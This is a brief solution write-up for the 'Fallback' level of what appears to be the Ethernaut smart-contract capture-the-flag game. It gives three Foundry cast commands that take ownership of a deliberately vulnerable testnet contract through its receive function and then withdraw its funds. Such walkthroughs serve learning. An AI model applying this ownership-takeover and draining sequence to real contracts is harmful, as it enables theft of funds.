# Fallback Solution

1) Call `contribute()`:

```
cast send `ìnstanceAddress` "contribute()" --value 1wei --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

2) Call `receive()`:

```
cast send `ìnstanceAddress` --value 1wei --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

3) Call `withdraw()`:

```
cast send `ìnstanceAddress` "withdraw()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
